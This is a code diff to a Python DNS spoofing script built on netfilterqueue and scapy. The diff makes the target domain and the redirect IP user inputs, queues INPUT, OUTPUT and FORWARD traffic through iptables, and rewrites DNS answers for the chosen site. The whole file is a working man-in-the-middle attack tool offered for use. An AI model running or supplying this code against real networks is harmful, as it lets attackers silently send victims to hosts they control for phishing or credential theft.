@@ -1,14 +1,17 @@
 import netfilterqueue
 import scapy.all as scapy
-import subprocess
- 
+import os
+key_website = bytes(input("enter the website u wanna redirect:"),  'utf-8')
+redirect_ip = input("enter ip you wanna redirect to:")
+que_num = int(input("enter queue number(for ip tables, if you dont know what to do, enter 3):"))
+print("IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F")
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname    
-        if  b'info.cern.ch'in qname:
+        if  key_website in qname:
             print("[+] Spoofing Target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.12")
+            answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
  
@@ -21,10 +24,13 @@ def process_packet(packet):
  
  
     packet.accept()
- 
-subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell = True)
-subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1', shell = True)
-
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(1, process_packet)
-queue.run()
+os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(que_num))
+os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(que_num)) 
+os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(que_num)) 
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(que_num, process_packet)
+    queue.run()
+except:
+    os.system('iptables -F')
+    print("CTRL + C detected, flushing ip table and cleaning things up")
